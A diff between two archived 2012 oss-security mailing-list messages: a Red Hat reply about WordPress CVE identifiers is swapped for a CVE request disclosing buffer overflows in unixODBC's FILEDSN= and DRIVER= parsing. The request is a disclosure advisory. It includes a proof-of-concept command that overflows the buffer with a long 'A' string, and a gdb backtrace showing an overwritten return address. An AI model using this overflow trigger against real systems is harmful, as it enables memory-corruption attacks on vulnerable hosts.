@@ -1,51 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/04/23/4
-Message-ID: <4F957C88.2030705@redhat.com>
-Date: Mon, 23 Apr 2012 10:00:08 -0600
-From: Kurt Seifried <kseifried@...hat.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2012/05/29/7
+Message-ID: <CA+5g0S+Gbx7M54nCCKHM067NGi+JRxXrYRdQHs1C+aYsLKH7Ow@mail.gmail.com>
+Date: Tue, 29 May 2012 09:42:42 -0300
+From: Felipe Pena <felipensp@...il.com>
 To: oss-security@...ts.openwall.com
-CC: cve-assign@...re.org, henri@...v.fi, "st >> \"Steven M. Christey\"" <coley@...us.mitre.org>
-Subject: Re: Re: Security vulnerabilities fixed in WordPress 3.3.2
+Subject: CVE id request: Multiple buffer overflow in unixODBC
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA1
+Hi, please assign a CVE id for the issue:
 
-On 04/23/2012 07:24 AM, cve-assign@...re.org wrote:
->> Page http://codex.wordpress.org/Version_3.3.2 says:
-> 
->> I asked from WordPress if these vulnerabilities already have
->> CVE-identifiers
-> 
-> Note that http://nvd.nist.gov/download/nvd-rss.xml is also among 
-> the sources to check for recent CVE assignments:
-> 
-> CVE-2012-2399 CVE-2012-2400 CVE-2012-2401 CVE-2012-2402 
-> CVE-2012-2403 CVE-2012-2404
-> 
+Multiple buffer overflow in unixODBC
+===========================
 
-Would it be possible to post just the Open Source subset of the CVENEW
-mailing list to OSS-SEC?
+The library unixODBC doesn't check properly the input from FILEDSN=,
+DRIVER= options in the DSN,
+which causes buffer overflow when passed to the SQLDriverConnect() function.
 
-- -- 
-Kurt Seifried Red Hat Security Response Team (SRT)
-PGP: 0x5E267993 A90B F995 7350 148F 66BF 7554 160D 4553 5E26 7993
+The unixODBC maintainer has been notified about the issue.
 
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1.4.12 (GNU/Linux)
-Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org/
+Version affected
+============
 
-iQIcBAEBAgAGBQJPlXyIAAoJEBYNRVNeJnmTrzkQANh+eyz/fg05sSY4xushcWp+
-fwaaaH8ARnohd2x3eUCeBVSSCCvMdU4hHtBMgpLQPzRH/D7uoMRAAL8rGYTZDBpb
-7Pav1NApYuUOSJR8qL3UBCN74M3vFSiSHsY6whCPhERxO7BhG3TfCjH+h35uN2Yf
-eFn4BmGKzrM9p91tZzH8XG0eWFaB3JfBAbiALR7DpEvuKxAeD98kIy4IJy1xjH8x
-SDK3ETBBfGV+BI5B/d4ig5vDChyhUB6wN3m+FiKIdGtaBxVY24w3AZgSDVp9D+Fs
-QKSY1NzQb0A7fMW7s77Pg7bfMdUah2gPvpYgIVQz8ZKouDZbkbC7IxrML+KuHwVa
-tu+s14B85a0xTZ5lGEPQFI3IY373t29dvvEZ9HWNvq8QDatm9DBRIpLZYsRnxE7r
-QQMsFRdUclbSh4J1zOfGcJvmojSDb0Ca4yMBEO4yjDQClxRIiN5iQ3w7yHT7Yygv
-3IhA4zh31PsqzX6BbKr885A7YlN1fLArlGYZRZ1SmEVDmbBjLpRSPWHikow2p87J
-TIZIygOQDMyJdy4vV2zgCSS6OZ1YAa1F9IueiJe32FbiQlxayIQhsAVHLiU4t6+U
-tyjikbNtYMq75/ATXORWZ2S8TudJ53FBWpPgW3SmTEazSam9yDHRRHtigIcVN43p
-r7nJyzdSNhNsrOAgEhOg
-=ZifB
------END PGP SIGNATURE-----
+FILEDSN= as of 2.0.10
+DRIVER= as of 2.3.1
+
+PoC
+===
+
+$ ./poc "FILEDSN=$(python -c "print 'A'*10000")"
+Segmentation fault
+
+(gdb) bt
+ #0  0x00007ffff7bc8c81 in SQLReadFileDSN (pszFileName=<value optimized
+ out>, pszAppName=<value optimized out>, pszKeyName=<value optimized
+ out>,
+    pszString=<value optimized out>, nString=<value optimized out>,
+ pnString=<value optimized out>) at SQLReadFileDSN.c:207
+ #1  0x4141414141414141 in ?? ()
+
+
+CREDITS
+=======
+
+This bug was discovered by Felipe Pena.
+BugSec Team - http://www.bugsec.com.br/
